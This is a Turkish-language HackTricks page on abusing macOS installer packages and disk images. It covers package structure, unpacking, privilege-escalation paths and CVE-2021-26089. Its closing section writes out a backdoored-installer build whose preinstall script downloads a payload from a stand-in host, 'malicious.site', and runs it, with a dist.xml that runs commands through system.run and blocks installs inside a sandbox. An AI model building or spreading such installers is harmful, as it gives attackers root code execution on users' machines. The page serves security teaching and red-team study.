# macOS Yükleyici İstismarı

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Pkg Temel Bilgiler

macOS **yükleyici paketi** (aynı zamanda `.pkg` dosyası olarak da bilinir), macOS tarafından **yazılım dağıtımı** için kullanılan bir dosya formatıdır. Bu dosyalar, bir yazılım parçasının doğru bir şekilde yüklenmesi ve çalışması için gereken her şeyi içeren bir **kutunun** içindeymiş gibi davranır.

Paket dosyası, hedef bilgisayara yüklenecek **dosya ve dizinlerin hiyerarşisini** tutan bir arşivdir. Ayrıca, yapılandırma dosyalarını ayarlamak veya yazılımın eski sürümlerini temizlemek gibi yüklemeden önce ve sonra görevleri yerine getirmek için **scriptler** de içerebilir.

### Hiyerarşi

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Dağıtım (xml)**: Özelleştirmeler (başlık, karşılama metni…) ve script/yükleme kontrolleri
* **Paket Bilgisi (xml)**: Bilgi, yükleme gereksinimleri, yükleme yeri, çalıştırılacak scriptlerin yolları
* **Malzeme listesi (bom)**: Yüklenmesi, güncellenmesi veya kaldırılması gereken dosyaların listesi ve dosya izinleri
* **Yük (CPIO arşivi gzip sıkıştırılmış)**: Paket Bilgisi'nden `install-location`'da yüklenecek dosyalar
* **Scriptler (CPIO arşivi gzip sıkıştırılmış)**: Yükleme öncesi ve sonrası scriptler ve yürütme için geçici bir dizine çıkarılan daha fazla kaynak.

### Sıkıştırmayı Aç
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG Temel Bilgiler

DMG dosyaları, veya Apple Disk Görüntüleri, Apple'ın macOS'u tarafından disk görüntüleri için kullanılan bir dosya formatıdır. Bir DMG dosyası esasen **monte edilebilir bir disk görüntüsü** (kendi dosya sistemini içerir) olup, genellikle sıkıştırılmış ve bazen şifrelenmiş ham blok verileri içerir. Bir DMG dosyasını açtığınızda, macOS **onu fiziksel bir disk gibi monte eder**, böylece içeriğine erişebilirsiniz.

{% hint style="danger" %}
Not edin ki **`.dmg`** yükleyicileri **çok sayıda formatı** destekler, geçmişte bazıları zafiyetler içerdiği için **kernel kodu yürütme** elde etmek için istismar edilmiştir.
{% endhint %}

### Hiyerarşi

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Bir DMG dosyasının hiyerarşisi içeriğe bağlı olarak farklı olabilir. Ancak, uygulama DMG'leri için genellikle bu yapıyı takip eder:

* Üst Düzey: Bu, disk görüntüsünün köküdür. Genellikle uygulamayı ve muhtemelen Uygulamalar klasörüne bir bağlantı içerir.
* Uygulama (.app): Bu, gerçek uygulamadır. macOS'ta, bir uygulama genellikle uygulamayı oluşturan birçok bireysel dosya ve klasörü içeren bir pakettir.
* Uygulamalar Bağlantısı: Bu, macOS'taki Uygulamalar klasörüne bir kısayoldur. Bunun amacı, uygulamayı yüklemenizi kolaylaştırmaktır. Uygulama dosyasını bu kısayola sürükleyerek uygulamayı yükleyebilirsiniz.

## pkg istismarı ile Privesc

### Kamu dizinlerinden yürütme

Eğer bir ön veya sonrası yükleme betiği örneğin **`/var/tmp/Installerutil`** dizininden yürütülüyorsa ve saldırgan bu betiği kontrol edebiliyorsa, her yürütüldüğünde ayrıcalıkları artırabilir. Veya başka bir benzer örnek:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Bu, birkaç yükleyici ve güncelleyici tarafından **root olarak bir şey yürütmek için** çağrılan bir [kamusal işlevdir](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg). Bu işlev, **yürütülecek dosyanın** **yolunu** parametre olarak kabul eder, ancak eğer bir saldırgan bu dosyayı **değiştirebilirse**, root ile yürütmesini **istismar edebilir** ve **ayrıcalıkları artırabilir**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Montaj ile yürütme

Eğer bir yükleyici `/tmp/fixedname/bla/bla` yoluna yazıyorsa, yükleme sürecini kötüye kullanmak için yükleme sırasında **herhangi bir dosyayı değiştirmek** amacıyla **/tmp/fixedname** üzerinde noowners ile **bir montaj oluşturmak** mümkündür.

Bunun bir örneği **CVE-2021-26089**'dur; bu, root olarak yürütme elde etmek için **dönemsel bir betiği** **üst üste yazmayı** başarmıştır. Daha fazla bilgi için konuşmaya göz atın: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg kötü amaçlı yazılım olarak

### Boş Yük

Gerçek bir yük olmadan, sadece **kötü amaçlı yazılım** içeren **ön ve sonrası yükleme betikleri** ile bir **`.pkg`** dosyası oluşturmak mümkündür.

### Dağıtım xml'inde JS

Paketin **dağıtım xml** dosyasına **`<script>`** etiketleri eklemek mümkündür ve bu kod yürütülecek ve **`system.run`** kullanarak **komutlar** **yürütülebilir**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Arka kapılı Yükleyici

dist.xml içinde bir betik ve JS kodu kullanan kötü niyetli yükleyici
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referanslar

* [**DEF CON 27 - Pkg'leri Açma: Macos Yükleyici Paketlerine ve Yaygın Güvenlik Açıklarına Bir Bakış**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "macOS Yükleyicilerinin Vahşi Dünyası" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Pkg'leri Açma: MacOS Yükleyici Paketlerine Bir Bakış**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Ekip Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Ekip Uzmanı (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
